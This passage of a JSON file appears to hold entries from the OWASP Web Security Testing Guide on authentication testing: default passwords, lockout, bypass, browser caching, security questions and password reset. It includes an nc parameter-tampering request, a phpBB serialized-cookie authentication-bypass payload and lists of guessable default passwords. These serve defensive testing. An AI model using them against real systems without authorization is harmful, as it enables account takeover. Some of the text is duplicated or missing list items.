        "test_objectives": ""
    },
    "WSTG-ATHN-02": {
        "summary": "<h3>Summary</h3><p>Many web applications and hardware devices have default passwords for the built-in administrative account. Although in some cases these can be randomly generated, they are often static, meaning that they can be easily guessed or obtained by an attacker.</p><p>Additionally, when new users are created on the applications, these may have predefined passwords set. These could either be generated automatically by the application, or manually created by staff. In both cases, if they are not generated in a secure manner, the passwords may be possible for an attacker to guess.</p><h3>Test Objectives</h3><ul><li>Determine whether the application has any user accounts with default passwords.</li><li>Review whether new user accounts are created with weak or predictable passwords.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The first step to identifying default passwords is to identify the software that is in use. This is covered in detail in the Information Gathering section of the guide.</p><p>Once the software has been identified, try to find whether it uses default passwords, and if so, what they are. This should include:</p><ul><li>Searching for “[SOFTWARE] default password”.</li><li>Reviewing the manual or vendor documentation.</li><li>Checking common default password databases, such asCIRT.net,SecLists Default PasswordsorDefaultCreds-cheat-sheet.</li><li>Inspecting the application source code (if available).</li><li>Installing the application on a virtual machine and inspecting it.</li><li>Inspecting the physical hardware for stickers (often present on network devices).</li></ul><p>If a default password can’t be found, try common options such as:</p><ul><li>“admin”, “password”, “12345”, or othercommon default passwords.</li><li>An empty or blank password.</li><li>The serial number or MAC address of the device.</li></ul><p>If the username is unknown, there are various options for enumerating users, discussed in the Testing for Account Enumeration guide. Alternatively, try common options such as “admin”, “root”, or “system”.</p><p>When staff within an organization manually create passwords for new accounts, they may do so in a predictable way. This can often be:</p><ul><li>A single common password such as “Password1”.</li><li>Organization specific details, such as the organization name or address.</li><li>Passwords that follow a simple pattern, such as “Monday123” if account is created on a Monday.</li></ul><p>These types of passwords are often difficult to identify from a black-box perspective, unless they can successfully be guessed or brute-forced. However, they are easy to identify when performing grey-box or white-box testing.</p><p>If the application automatically generates passwords for new user accounts, these may also be predictable. In order to test these, create multiple accounts on the application with similar details at the same time, and compare the passwords that are given for them.</p><p>The passwords may be based on:</p><ul><li>A single static string shared between accounts.</li><li>A hashed or obfuscated part of the account details, such asmd5($username).</li><li>A time-based algorithm.</li><li>A weak pseudo-random number generator (PRNG).</li></ul><p>This type of issue of often difficult to identify from a black-box perspective.</p>",
        "tools": "<h3>Tools</h3><ul><li>Burp Intruder</li><li>THC Hydra</li><li>Nikto 2</li><li>NucleiDefault Login - Nuclei Templates</li><li>Default Login - Nuclei Templates</li></ul><ul><li>Default Login - Nuclei Templates</li></ul><h3>References</h3><ul><li>CIRT</li><li>SecLists Default Passwords</li><li>DefaultCreds-cheat-sheet</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHN-03": {
        "summary": "<h3>Summary</h3><p>Account lockout mechanisms are used to mitigate brute force attacks. Some of the attacks that can be defeated by using lockout mechanism:</p><ul><li>Login password or username guessing attack.</li><li>Code guessing on any 2FA functionality or Security Questions.</li></ul><p>Account lockout mechanisms require a balance between protecting accounts from unauthorized access and protecting users from being denied authorized access. Accounts are typically locked after 3 to 5 unsuccessful attempts and can only be unlocked after a predetermined period of time, via a self-service unlock mechanism, or intervention by an administrator.</p><p>Despite it being easy to conduct brute force attacks, the result of a successful attack is dangerous as the attacker will have full access on the user account and with it all the functionality and services they have access to.</p><h3>Test Objectives</h3><ul><li>Evaluate the account lockout mechanism’s ability to mitigate brute force password guessing.</li><li>Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>To test the strength of lockout mechanisms, you will need access to an account that you are willing or can afford to lock. If you have only one account with which you can log on to the web application, perform this test at the end of your test plan to avoid losing testing time by being locked out.</p><p>To evaluate the account lockout mechanism’s ability to mitigate brute force password guessing, attempt an invalid log in by using the incorrect password a number of times, before using the correct password to verify that the account was locked out. An example test may be as follows:</p><p>There are more unique implementations of lockout mechanisms in use that are still acceptable. One of which is AWS’s Cognito . It uses a simple scaling algorithm that mitigates brute-force attacks while not enabling long-term denial-of-service attacks against the affected user. After 5 failed sign-in attempts with a password, the user is locked out for one second. The lockout duration doubles with each failed attempt, with a maximum of 15 minutes. Sign-in attempts made during the lockout period are exceptions referred to as Password attempts exceeded , and in most implementations are not returned to the user who initiated the sign-in. If they aren’t shown to the user, a tester may think that no lockout mechanism is being used, as 200 rapid attempts to sign-in would generate a lot of the exceptions, and very few legitimate failed sign-in attempts.</p><p>The math behind the mechanism is: 2^(n-5) , with n being the number of failed sign-in attempts. The resulting number is the amount of seconds that the user is locked out. To reset the lockout count to zero, the user must sign-in successfully or wait the 15 minutes.</p><p>To test for this using a fuzzing tool, such as Burp Suite’s Intruder, navigate into the “Resource Pool”. Then set the maximum concurrent requests to 1 and the delay between requests to 2 seconds. Attempt the invalid authentication 200 times, then attempt to use the valid credentials 3 times directly after the fuzzing tool finishes. Wait 2 minutes and attempt to sign-in. If sign-in is then successful, Cognito may be in use. Further testing can then be performed to validate the use of Cognito by attempting to push the lockout time higher, but it may be easier to validate this information with the client.</p><p>A CAPTCHA may hinder brute force attacks, but they can come with their own set of weaknesses, and should not replace a lockout mechanism. A CAPTCHA mechanism may be bypassed if implemented incorrectly. CAPTCHA flaws include:</p><p>To evaluate CAPTCHA effectiveness:</p><p>Repeat this process to every possible functionality that could require a lockout mechanism.</p><p>To evaluate the unlock mechanism’s resistance to unauthorized account unlocking, initiate the unlock mechanism and look for weaknesses. Typical unlock mechanisms may involve secret questions or an emailed unlock link. The unlock link should be a unique one-time link, to stop an attacker from guessing or replaying the link and performing brute force attacks in batches.</p><p>Note that an unlock mechanism should only be used for unlocking accounts. It is not the same as a password recovery mechanism, yet could follow the same security practices.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Apply account unlock mechanisms depending on the risk level. In order from lowest to highest assurance:</p><p>Factors to consider when implementing an account lockout mechanism:</p><h3>References</h3><ul><li>See the OWASP article onBrute ForceAttacks.</li><li>Forgot Password CS.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-ATHN-04": {
        "summary": "<h3>Summary</h3><p>In computer security, authentication is the process of attempting to verify the digital identity of the sender of a communication. A common example of such a process is the log on process. Testing the authentication schema means understanding how the authentication process works and using that information to circumvent the authentication mechanism.</p><p>While most applications require authentication to gain access to private information or to execute tasks, not every authentication method is able to provide adequate security. Negligence, ignorance, or simple understatement of security threats often result in authentication schemes that can be bypassed by simply skipping the log in page and directly calling an internal page that is supposed to be accessed only after authentication has been performed.</p><p>In addition, it is often possible to bypass authentication measures by tampering with requests and tricking the application into thinking that the user is already authenticated. This can be accomplished either by modifying the given URL parameter, by manipulating the form, or by counterfeiting sessions.</p><p>Problems related to the authentication schema can be found at different stages of the software development lifecycle (SDLC), like the design, development, and deployment phases:</p><ul><li>In the design phase errors can include a wrong definition of application sections to be protected, the choice of not applying strong encryption protocols for securing the transmission of credentials, and many more.</li><li>In the development phase errors can include the incorrect implementation of input validation functionality or not following the security best practices for the specific language.</li><li>In the application deployment phase, there may be issues during the application setup (installation and configuration activities) due to a lack in required technical skills or due to the lack of good documentation.</li></ul><h3>Test Objectives</h3><ul><li>Ensure that authentication is applied across all services that require it.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>There are several methods of bypassing the authentication schema that is used by a web application:</p><ul><li>Direct page request (forced browsing)</li><li>Parameter modification</li><li>Session ID prediction</li><li>SQL injection</li></ul><p>If a web application implements access control only on the log in page, the authentication schema could be bypassed. For example, if a user directly requests a different page via forced browsing, that page may not check the credentials of the user before granting access. Attempt to directly access a protected page through the address bar in your browser to test using this method.</p><p>Figure 4.4.4-1: Direct Request to Protected Page</p><br><p>Another problem related to authentication design is when the application verifies a successful log in on the basis of a fixed value parameters. A user could modify these parameters to gain access to the protected areas without providing valid credentials. In the example below, the “authenticated” parameter is changed to a value of “yes”, which allows the user to gain access. In this example, the parameter is in the URL, but a proxy could also be used to modify the parameter, especially when the parameters are sent as form elements in a POST request or when the parameters are stored in a cookie.</p><pre><code>https://www.site.com/page.asp?authenticated=no\n\nraven@blackbox /home $nc www.site.com 80\nGET /page.asp?authenticated=yes HTTP/1.0\n\nHTTP/1.1 200 OK\nDate: Sat, 11 Nov 2006 10:22:44 GMT\nServer: Apache\nConnection: close\nContent-Type: text/html; charset=iso-8859-1 <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <HTML><HEAD> </HEAD><BODY> <H1> You Are Authenticated </H1> </BODY></HTML></code></pre><p>Figure 4.4.4-2: Parameter Modified Request</p><br><p>Many web applications manage authentication by using session identifiers (session IDs). Therefore, if session ID generation is predictable, a malicious user could be able to find a valid session ID and gain unauthorized access to the application, impersonating a previously authenticated user.</p><p>In the following figure, values inside cookies increase linearly, so it could be easy for an attacker to guess a valid session ID.</p><p>Figure 4.4.4-3: Cookie Values Over Time</p><br><p>In the following figure, values inside cookies change only partially, so it’s possible to restrict a brute force attack to the defined fields shown below.</p><p>Figure 4.4.4-4: Partially Changed Cookie Values</p><br><p>SQL Injection is a widely known attack technique. This section is not going to describe this technique in detail as there are several sections in this guide that explain injection techniques beyond the scope of this section.</p><p>Figure 4.4.4-5: SQL Injection</p><br><p>The following figure shows that with a simple SQL injection attack, it is sometimes possible to bypass the authentication form.</p><p>Figure 4.4.4-6: Simple SQL Injection Attack</p><br><p>If an attacker has been able to retrieve the application source code by exploiting a previously discovered vulnerability (e.g., directory traversal), or from a web repository (Open Source Applications), it could be possible to perform refined attacks against the implementation of the authentication process.</p><p>In the following example (PHPBB 2.0.12 - Authentication Bypass Vulnerability), at line 2 the unserialize() function parses a user supplied cookie and sets values inside the $sessiondata array. At line 7, the user’s MD5 password hash stored inside the backend database ( $auto_login_key ) is compared to the one supplied ( $sessiondata['autologinid'] ) by the user.</p><pre><code>1. if ( isset ( $HTTP_COOKIE_VARS [ $cookiename . '_sid' ])) { 2. $sessiondata = isset ( $HTTP_COOKIE_VARS [ $cookiename . '_data' ]) ? unserialize ( stripslashes ( $HTTP_COOKIE_VARS [ $cookiename . '_data' ])) : array (); 3. $sessionmethod = SESSION_METHOD_COOKIE ; 4. } 5. $auto_login_key = $userdata [ 'user_password' ]; 6. // We have to login automagically 7. if ( $sessiondata [ 'autologinid' ] == $auto_login_key ) 8. { 9. // autologinid matches password 10. $login = 1 ; 11. $enable_autologin = 1 ; 12. }</code></pre><p>In PHP, a comparison between a string value and a true boolean value is always true (because the string contains a value), so by supplying the following string to the unserialize() function, it is possible to bypass the authentication control and log in as administrator, whose userid is 2:</p><pre><code>a : 2 : { s : 11 : \"autologinid\" ; b : 1 ; s : 6 : \"userid\" ; s : 1 : \"2\" ;} // original value: a:2:{s:11:\"autologinid\";s:32:\"8b8e9715d12e4ca12c4c3eb4865aaf6a\";s:6:\"userid\";s:4:\"1337\";}</code></pre><p>Let’s disassemble what we did in this string:</p>",
        "tools": "<h3>Tools</h3><ul><li>WebGoat</li><li>Zed Attack Proxy (ZAP)</li></ul><h3>References</h3><ul><li>Niels Teusink: phpBB 2.0.12 authentication bypass</li><li>David Endler: “Session ID Brute Force Exploitation and Prediction”</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHN-05": {
        "summary": "<h3>Summary</h3><p>Credentials are the most widely used authentication technology. Due to such a wide usage of username-password pairs, users are no longer able to properly handle their credentials across the multitude of used applications.</p><p>In order to assist users with their credentials, multiple technologies surfaced:</p><ul><li>Applications provide aremember mefunctionality that allows the user to stay authenticated for long periods of time, without asking the user again for their credentials.</li><li>Password Managers - including browser password managers - that allow the user to store their credentials in a secure manner and later on inject them in user-forms without any user intervention.</li></ul><h3>Test Objectives</h3><ul><li>Validate that the generated session is managed securely and do not put the user’s credentials in danger.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>As these methods provide a better user experience and allow the user to forget all about their credentials, they increase the attack surface area. Some applications:</p><ul><li>Store the credentials in an encoded fashion in the browser’s storage mechanisms, which can be verified by following theweb storage testing scenarioand going through thesession analysisscenarios. Credentials shouldn’t be stored in any way in the client-side application, and should be substituted by tokens generated server-side.</li><li>Automatically inject the user’s credentials that can be abused by:ClickJackingattacks.CSRFattacks.</li><li>ClickJackingattacks.</li><li>CSRFattacks.</li><li>Tokens should be analyzed in terms of token-lifetime, where some tokens never expire and put the users in danger if those tokens ever get stolen. Make sure to follow thesession timeouttesting scenario.</li></ul><ul><li>ClickJackingattacks.</li><li>CSRFattacks.</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><ul><li>Followsession managementgood practices.</li><li>Ensure that no credentials are stored in clear text or are easily retrievable in encoded or encrypted forms in browser storage mechanisms; they should be stored server-side and follow goodpassword storagepractices.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-ATHN-06": {
        "summary": "<h3>Summary</h3><p>In this phase the tester checks that the application correctly instructs the browser to not retain sensitive data.</p><p>Browsers can store information for purposes of caching and history. Caching is used to improve performance, so that previously displayed information doesn’t need to be downloaded again. History mechanisms are used for user convenience, so the user can see exactly what they saw at the time when the resource was retrieved. If sensitive information is displayed to the user (such as their address, credit card details, Social Security Number, or username), then this information could be stored for purposes of caching or history, and therefore retrievable through examining the browser’s cache or by simply pressing the browser’s Back button.</p><h3>Test Objectives</h3><ul><li>Review if the application stores sensitive information on the client-side.</li><li>Review if access can occur without authorization.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Technically, the Back button is a history and not a cache (see Caching in HTTP: History Lists ). The cache and the history are two different entities. However, they share the same weakness of presenting previously displayed sensitive information.</p><p>The first and simplest test consists of entering sensitive information into the application and logging out. Then the tester clicks the Back button of the browser to check whether previously displayed sensitive information can be accessed whilst unauthenticated.</p><p>If by pressing the Back button the tester can access previous pages but not access new ones, then it is not an authentication issue, but a browser history issue. If these pages contain sensitive data, it means that the application did not forbid the browser from storing it.</p><p>Authentication does not necessarily need to be involved in the testing. For example, when a user enters their email address in order to sign up to a newsletter, this information could be retrievable if not properly handled.</p><p>The Back button can be stopped from showing sensitive data. This can be done by:</p><ul><li>Delivering the page over HTTPS.</li><li>SettingCache-Control: must-revalidate</li></ul><p>Here testers check that the application does not leak any sensitive data into the browser cache. In order to do that, they can use a proxy (such as ZAP) and search through the server responses that belong to the session, checking that for every page that contains sensitive information the server instructed the browser not to cache any data. Such a directive can be issued in the HTTP response headers with the following directives:</p><ul><li>Cache-Control: no-cache, no-store</li><li>Expires: 0</li><li>Pragma: no-cache</li></ul><p>These directives are generally robust, although additional flags may be necessary for the Cache-Control header in order to better prevent persistently linked files on the file system. These include:</p><ul><li>Cache-Control: must-revalidate, max-age=0, s-maxage=0</li></ul><pre><code>HTTP/1.1:\nCache-Control: no-cache</code></pre><pre><code>HTTP/1.0:\nPragma: no-cache\nExpires: \"past date or illegal value (e.g., 0)\"</code></pre><p>For instance, if testers are testing an e-commerce application, they should look for all pages that contain a credit card number or some other financial information, and check that all those pages enforce the no-cache directive. If they find pages that contain critical information but that fail to instruct the browser not to cache their content, they know that sensitive information will be stored on the disk, and they can double-check this simply by looking for the page in the browser cache.</p><p>The exact location where that information is stored depends on the client operating system and on the browser that has been used. Here are some examples:</p><ul><li>Mozilla Firefox:Unix/Linux:~/.cache/mozilla/firefox/Windows:C:\\Users\\<user_name>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile-id>\\Cache2\\</li><li>Unix/Linux:~/.cache/mozilla/firefox/</li><li>Windows:C:\\Users\\<user_name>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile-id>\\Cache2\\</li><li>Internet Explorer:C:\\Users\\<user_name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\</li><li>C:\\Users\\<user_name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\</li><li>Chrome:Windows:C:\\Users\\<user_name>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\CacheUnix/Linux:~/.cache/google-chrome</li><li>Windows:C:\\Users\\<user_name>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache</li><li>Unix/Linux:~/.cache/google-chrome</li></ul><ul><li>Unix/Linux:~/.cache/mozilla/firefox/</li><li>Windows:C:\\Users\\<user_name>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile-id>\\Cache2\\</li></ul><ul><li>C:\\Users\\<user_name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\</li></ul><ul><li>Windows:C:\\Users\\<user_name>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache</li><li>Unix/Linux:~/.cache/google-chrome</li></ul><p>Firefox provides functionality for viewing cached information, which may be to your benefit as a tester. Of course the industry has also produced various extensions, and external apps which you may prefer or need for Chrome, Internet Explorer, or Edge.</p><p>Cache details are also available via developer tools in most modern browsers, such as Firefox , Chrome , and Edge. With Firefox it is also possible to use the URL about:cache to check cache details.</p><p>Handling of cache directives may be completely different for mobile browsers. Therefore, testers should start a new browsing session with clean caches and take advantage of features like Chrome’s Device Mode or Firefox’s Responsive Design Mode to re-test or separately test the concepts outlined above.</p><p>Additionally, personal proxies such as ZAP and Burp Suite allow the tester to specify which User-Agent should be sent by their spiders/crawlers. This could be set to match a mobile browser User-Agent string and used to see which caching directives are sent by the application being tested.</p><p>The methodology for testing is equivalent to the black-box case, as in both scenarios testers have full access to the server response headers and to the HTML code. However, with gray-box testing, the tester may have access to account credentials that will allow them to test sensitive pages that are accessible only to authenticated users.</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li></ul><h3>References</h3><ul><li>Caching in HTTP</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHN-07": {
        "summary": "<h3>Summary</h3><p>The most prevalent and most easily administered authentication mechanism is a static password. The password represents the keys to the kingdom, but is often subverted by users in the name of usability. In each of the recent high profile hacks that have revealed user credentials, it is lamented that most common passwords are still: 123456 , password and qwerty .</p><p>Additionally, applications may utilize alternative credentials that are treated the same as a password, but are considerably weaker, such as a birthdates, social security numbers, PINs, or security questions. In some scenarios, these more easily guessed credentials may act as the only user supplied value for authentication.</p><h3>Test Objectives</h3><ul><li>Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>BothNISTandNCSCrecommendagainstforcing regular password expiry, although it may be required by standards such as PCI DSS.</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>To mitigate the risk of easily guessed passwords facilitating unauthorized access there are two solutions: introduce additional authentication controls (i.e. two-factor authentication) or introduce a strong password policy. The simplest and cheapest of these is the introduction of a strong password policy that ensures password length, complexity, reuse and aging; although ideally both of them should be implemented.</p><h3>References</h3><ul><li>Brute Force Attacks</li></ul>",
        "test_objectives": ""
    },
    "WSTG-ATHN-08": {
        "summary": "<h3>Summary</h3><p>Often called “secret” questions and answers, security questions and answers are often used to recover forgotten passwords (see Testing for weak password change or reset functionalities , or as extra security on top of the password.</p><p>They are typically generated upon account creation and require the user to select from some pre-generated questions and supply an appropriate answer. They may allow the user to generate their own question and answer pairs. Both methods are prone to insecurities. Ideally, security questions should generate answers that are only known by the user, and not guessable or discoverable by anybody else. This is harder than it sounds.\nSecurity questions and answers rely on the secrecy of the answer. Questions and answers should be chosen so that the answers are only known by the account holder. However, although a lot of answers may not be publicly known, most of the questions that sites implement promote answers that are pseudo-private.</p><p>The majority of pre-generated questions are fairly simplistic in nature and can lead to insecure answers. For example:</p><ul><li>The answers may be known to family members or close friends of the user, e.g. “What is your mother’s maiden name?”, “What is your date of birth?”</li><li>The answers may be easily guessable, e.g. “What is your favorite color?”, “What is your favorite baseball team?”</li><li>The answers may be brute forcible, e.g. “What is the first name of your favorite high school teacher?” - the answer is probably on some easily downloadable lists of popular first names, and therefore a simple brute force attack can be scripted.</li><li>The answers may be publicly discoverable, e.g. “What is your favorite movie?” - the answer may easily be found on the user’s social media profile page.</li></ul><p>The problem with having users to generate their own questions is that it allows them to generate very insecure questions, or even bypass the whole point of having a security question in the first place. Here are some real world examples that illustrate this point:</p><ul><li>“What is 1+1?”</li><li>“What is your username?”</li><li>“My password is S3curIty!”</li></ul><h3>Test Objectives</h3><ul><li>Determine the complexity and how straight-forward the questions are.</li><li>Assess possible user answers and brute force capabilities.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Try to obtain a list of security questions by creating a new account or by following the “I don’t remember my password”-process. Try to generate as many questions as possible to get a good idea of the type of security questions that are asked. If any of the security questions fall in the categories described above, they are vulnerable to being attacked (guessed, brute-forced, available on social media, etc.).</p><p>Try to create security questions by creating a new account or by configuring your existing account’s password recovery properties. If the system allows the user to generate their own security questions, it is vulnerable to having insecure questions created. If the system uses the self-generated security questions during the forgotten password functionality and if usernames can be enumerated (see Testing for Account Enumeration and Guessable User Account , then it should be easy for the tester to enumerate a number of self-generated questions. It should be expected to find several weak self-generated questions using this method.</p><p>Use the methods described in Testing for Weak lock out mechanism to determine if a number of incorrectly supplied security answers trigger a lockout mechanism.</p><p>The first thing to take into consideration when trying to exploit security questions is the number of questions that need to be answered. The majority of applications only need the user to answer a single question, whereas some critical applications may require the user to answer two or even more questions.</p><p>The next step is to assess the strength of the security questions. Could the answers be obtained by a simple Google search or with social engineering attack? As a penetration tester, here is a step-by-step walkthrough of exploiting a security question scheme:</p><ul><li>Does the application allow the end user to choose the question that needs to be answered? If so, focus on questions which have:A “public” answer; for example, something that could be find with a simple search-engine query.A factual answer such as a “first school” or other facts which can be looked up.Few possible answers, such as “what model was your first car”. These questions would present the attacker with a short list of possible answers, and based on statistics the attacker could rank answers from most to least likely.</li><li>A “public” answer; for example, something that could be find with a simple search-engine query.</li><li>A factual answer such as a “first school” or other facts which can be looked up.</li><li>Few possible answers, such as “what model was your first car”. These questions would present the attacker with a short list of possible answers, and based on statistics the attacker could rank answers from most to least likely.</li><li>Determine how many guesses you have if possible.Does the password reset allow unlimited attempts?Is there a lockout period after X incorrect answers? Keep in mind that a lockout system can be a security problem in itself, as it can be exploited by an attacker to launch a Denial of Service against legitimate users.Pick the appropriate question based on analysis from the above points, and do research to determine the most likely answers.</li><li>Does the password reset allow unlimited attempts?</li><li>Is there a lockout period after X incorrect answers? Keep in mind that a lockout system can be a security problem in itself, as it can be exploited by an attacker to launch a Denial of Service against legitimate users.</li><li>Pick the appropriate question based on analysis from the above points, and do research to determine the most likely answers.</li></ul><p>Does the application allow the end user to choose the question that needs to be answered? If so, focus on questions which have:</p><ul><li>A “public” answer; for example, something that could be find with a simple search-engine query.</li><li>A factual answer such as a “first school” or other facts which can be looked up.</li><li>Few possible answers, such as “what model was your first car”. These questions would present the attacker with a short list of possible answers, and based on statistics the attacker could rank answers from most to least likely.</li></ul><p>Determine how many guesses you have if possible.</p><ul><li>Does the password reset allow unlimited attempts?</li><li>Is there a lockout period after X incorrect answers? Keep in mind that a lockout system can be a security problem in itself, as it can be exploited by an attacker to launch a Denial of Service against legitimate users.</li><li>Pick the appropriate question based on analysis from the above points, and do research to determine the most likely answers.</li></ul><p>The key to successfully exploiting and bypassing a weak security question scheme is to find a question or set of questions which give the possibility of easily finding the answers. Always look for questions which can give you the greatest statistical chance of guessing the correct answer, if you are completely unsure of any of the answers. In the end, a security question scheme is only as strong as the weakest question.</p><h3>References</h3><ul><li>The Curse of the Secret Question</li><li>The OWASP Security Questions Cheat Sheet</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-ATHN-09": {
        "summary": "<h3>Summary</h3><p>For any application that requires the user to authenticate with a password, there must be a mechanism by which the user can regain access to their account if they forget their password. Although this can sometimes be a manual process that involves contacting the owner of the website or a support team, users are frequently allowed to carry out a self-service password reset, and to regain access to their account by providing some other evidence of their identity.</p><p>As this functionality provides a direct route to compromise the user’s account, it is crucial that it is implemented securely.</p><h3>Test Objectives</h3><ul><li>Determine whether the password change and reset functionality allows accounts to be compromised.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The first step is to gather information about what mechanisms are available to allow the user to reset their password on the application. If there are multiple interfaces on the same site (such as a web interface, mobile application, and API) then these should all be reviewed, in case they provide different functionality.</p><p>Once this has been established, determine what information is required in order for a user to initiate a password reset. This can be the username or email address (both of which may be obtained from public information), but it could also be an internally-generated user ID.</p><p>Regardless of the specific methods used to reset passwords, there are a number of common areas that need to be considered:</p><ul><li>Is the password reset process weaker than the authentication process?The password reset process provides an alternative mechanism to access a user’s account, and so should be at least as secure as the usual authentication process. However, it can provide an easier way to compromise the account, especially if it uses weaker authentication factors such as security questions.Additionally, the password reset process may bypass the requirement to use Multi-Factor Authentication (MFA), which can substantially reduce the security of the application.</li><li>Is there rate limiting or other protection against automated attacks?As with any authentication mechanism, the password reset process should have protection against automated or brute-force attacks. There are a variety of different methods that can be used to achieve this, such as rate limiting or the use of CAPTCHA. These are particularly important on functionality that triggers external actions (such as sending an email or SMS), or when the user is entering a password reset token.It is also possible to protect against brute-force attacks by locking out the account from the password reset process after a certain number of consecutive attempts. This could also prevent a legitimate user from being able to reset their password and regain access to their account, however.</li><li>Is it vulnerable to common attacks?As well as the specific areas discussed in this guide, it’s also important to check for other common vulnerabilities such as SQL injection or cross-site scripting.</li><li>Does the reset process allow user enumeration?See theTesting for Account Enumerationguide for further information.</li></ul><p>Is the password reset process weaker than the authentication process?</p><p>The password reset process provides an alternative mechanism to access a user’s account, and so should be at least as secure as the usual authentication process. However, it can provide an easier way to compromise the account, especially if it uses weaker authentication factors such as security questions.</p><p>Additionally, the password reset process may bypass the requirement to use Multi-Factor Authentication (MFA), which can substantially reduce the security of the application.</p><p>Is there rate limiting or other protection against automated attacks?</p><p>As with any authentication mechanism, the password reset process should have protection against automated or brute-force attacks. There are a variety of different methods that can be used to achieve this, such as rate limiting or the use of CAPTCHA. These are particularly important on functionality that triggers external actions (such as sending an email or SMS), or when the user is entering a password reset token.</p><p>It is also possible to protect against brute-force attacks by locking out the account from the password reset process after a certain number of consecutive attempts. This could also prevent a legitimate user from being able to reset their password and regain access to their account, however.</p><p>Is it vulnerable to common attacks?</p><p>As well as the specific areas discussed in this guide, it’s also important to check for other common vulnerabilities such as SQL injection or cross-site scripting.</p><p>Does the reset process allow user enumeration?</p><p>See the Testing for Account Enumeration guide for further information.</p><p>In this model, the user is sent a new password via email once they have proved their identity. This is considered less secure for two main reasons:</p><ul><li>The password is sent to the user in an unencrypted form.</li><li>The password for the account is changed when the request is made, effectively locking the user out of their account until they receive the email. By making repeated requests, it is possible to prevent a user from being able to access their account.</li></ul><p>Where this approach is used, the following areas should be reviewed:</p><ul><li>Is the user forced to change the password on initial login?The new password is sent over unencrypted email, and may sit in the user’s inbox indefinitely if they don’t delete the email. As such, the user should be required to change the password as soon as they log in for the first time.</li><li>Is the password securely generated?The password should be generated using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long to prevent password guessing or brute-force attacks. For a secure user-friendly experience, it should be generated using a secure passphrase-style approach (i.e, combining multiple words), rather than a string of random characters.</li><li>Is the user’s existing password sent to them?Rather than generating a new password for the user, some applications will send the user their existing password. This is a very insecure approach, as it exposes their current password over unencrypted email. Additionally, if the site is able to recover the existing password, this implies that passwords are either stored using reversible encryption, or (more likely) in unencrypted plain text, both of which represent a serious security weakness.</li><li>Are the emails sent from a domain with anti-spoofing protection?The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.</li><li>Is email considered sufficiently secure?Emails are typically sent unencrypted, and in many cases the user’s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.</li></ul><p>Is the user forced to change the password on initial login?</p><p>The new password is sent over unencrypted email, and may sit in the user’s inbox indefinitely if they don’t delete the email. As such, the user should be required to change the password as soon as they log in for the first time.</p><p>Is the password securely generated?</p><p>The password should be generated using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long to prevent password guessing or brute-force attacks. For a secure user-friendly experience, it should be generated using a secure passphrase-style approach (i.e, combining multiple words), rather than a string of random characters.</p><p>Is the user’s existing password sent to them?</p><p>Rather than generating a new password for the user, some applications will send the user their existing password. This is a very insecure approach, as it exposes their current password over unencrypted email. Additionally, if the site is able to recover the existing password, this implies that passwords are either stored using reversible encryption, or (more likely) in unencrypted plain text, both of which represent a serious security weakness.</p><p>Are the emails sent from a domain with anti-spoofing protection?</p><p>The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.</p><p>Is email considered sufficiently secure?</p><p>Emails are typically sent unencrypted, and in many cases the user’s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.</p><p>Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.</p><p>In this model, the user is emailed a link that contains a token. They can then click this link, and are prompted to enter a new password on the site. This is the most common approach used for password reset, but is more complex to implement than the previously discussed approach. The key areas to test are:</p><ul><li>Does the link use HTTPS?If the token is sent over unencrypted HTTP, it may be possible for an attacker to intercept it.</li><li>Can the link be used multiple times?Links should expire after they are used, otherwise they provide a persistent backdoor for the account.</li><li>Does the link expire if it remains unused?Links should be time limited. Exactly how long is appropriate will depend on the site, but it should rarely be more than an hour.</li><li>Is the token sufficiently long and random?The security of the process is entirely reliant on an attacker not being able to guess or brute-force a token. The tokens should be generated with a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long that it is impractical for an attacker to guess or brute-force. At least 128 bits (or 32 hex characters) is a sufficient minimum to make such an online attack impractical.Tokens should never be generated based on known values, such as by taking the MD5 hash of the user’s email withmd5($email), or using GUIDs which may use insecure PRNG functions, or may not even be random depending on the type.An alternative approach to random tokens is to use a cryptographically signed token such as a JWT. In this case, the usual JWT checks should be carried out (is the signature verified, can the “nONe” algorithm be used, can the HMAC key be brute-forced, etc). See theTesting JSON Web Tokensguide for further information.</li><li>Does the 